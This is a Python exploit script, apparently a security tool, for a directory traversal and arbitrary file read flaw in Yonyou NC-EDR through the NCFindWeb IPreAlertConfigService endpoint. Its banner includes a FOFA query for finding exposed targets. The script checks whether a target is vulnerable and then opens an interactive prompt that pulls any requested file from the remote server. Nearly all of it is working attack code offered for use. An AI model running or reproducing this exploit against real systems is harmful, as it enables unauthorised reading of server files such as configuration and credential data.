"""
encoding: utf-8
@author: Mr.An
@file: yonyouEDR_NC_RAF_EXP.py
@time: 2022/1/12 20:02
"""
import json
import requests
from argparse import ArgumentParser


class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        print("timeout:", self.args.timeout)
        self.url = self.args.url
        self.hasVuln = False
        self.exploit()

    def banner(self):
        logo = r"""
__     ____     ________ _____  _____  _____                _                      ______ _ _      
\ \   / /\ \   / /  ____|  __ \|  __ \|  __ \              | |   /\               |  ____(_) | EXP    
 \ \_/ /  \ \_/ /| |__  | |  | | |__) | |__) |___  __ _  __| |  /  \   _ __  _   _| |__   _| | ___ 
  \   /    \   / |  __| | |  | |  _  /|  _  // _ \/ _` |/ _` | / /\ \ | '_ \| | | |  __| | | |/ _ \
   | |      | |  | |____| |__| | | \ \| | \ \  __/ (_| | (_| |/ ____ \| | | | |_| | |    | | |  __/   
   |_|      |_|  |______|_____/|_|  \_\_|  \_\___|\__,_|\__,_/_/    \_\_| |_|\__, |_|    |_|_|\___|    
                                                                              __/ |                
                                                                             |___/         Author:Mr.An        """

        msg = """
=================================================================
| 漏洞名称 | 用友NC-EDR系统存在目录遍历&任意文件读取
| 漏洞时间 | =========
| 影响版本 | NC-EDR
| 漏洞文件 | ？？
| 默认路径 | /NCFindWeb?service=IPreAlertConfigService&filename=
| FOFA语句 | app="用友-UFIDA-NC"
=================================================================
                """
        print("\033[1;31m" + logo + "\033[0m")
        print(msg)

    def parseArgs(self):
        parse = ArgumentParser()
        parse.add_argument("-u", "--url", required=False, type=str, help="The target address,(ip:port) or url")
        parse.add_argument("-t", "--timeout", required=False, type=int, default=3, help="request timeout(default 3)")
        return parse.parse_args()

    def verify(self):
        self.url = self.url.replace("http://", "") if "http://" in self.url else self.url
        self.url = self.url.replace("https://", "") if "https://" in self.url else self.url
        repData = self.readFile("./")
        if "WEB-INF" in repData:
            msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
            self.hasVuln = True

        elif "Conn" == repData:
            msg = f"\033[31m[!] [ Conn ]  {self.url}\033[0m"
        else:
            repData = self.readFile("./login.jsp")
            if r'<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>' in repData:
                msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
                self.hasVuln = True
            elif "Conn" == repData:
                msg = f"\033[31m[!] [ Conn ]  {self.url}\033[0m"
            else:
                msg = f"[-] [ Safe ]  {self.url}"
        print(msg)

    def readFile(self, filename):
        data = "/NCFindWeb?service=IPreAlertConfigService&filename=" + filename
        url = "http://" + self.url + data
        # print(self.url)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            rspData = requests.get(url=url, headers=headers, timeout=self.args.timeout).content.decode("utf-8")
            return rspData
        except:
            return "Conn"

    def exploit(self):
        self.verify()
        if self.hasVuln:
            while True:
                try:
                    remoteFile = input("\033[42m" + "Input File/Path>" + "\033[0m" + " ")
                    resultData = self.readFile(remoteFile)
                    if "操作失败" not in resultData:
                        print("\n", resultData.strip(), "\n")
                    else:
                        print("\nError.\n")
                except KeyboardInterrupt:
                    print("\n\nBye~\n")
                    return
                except:
                    print("\nError.\n")
#关于操作失败的情况我没见到，所以这个操作失败会误判吧！


if __name__ == '__main__':
    EXP()

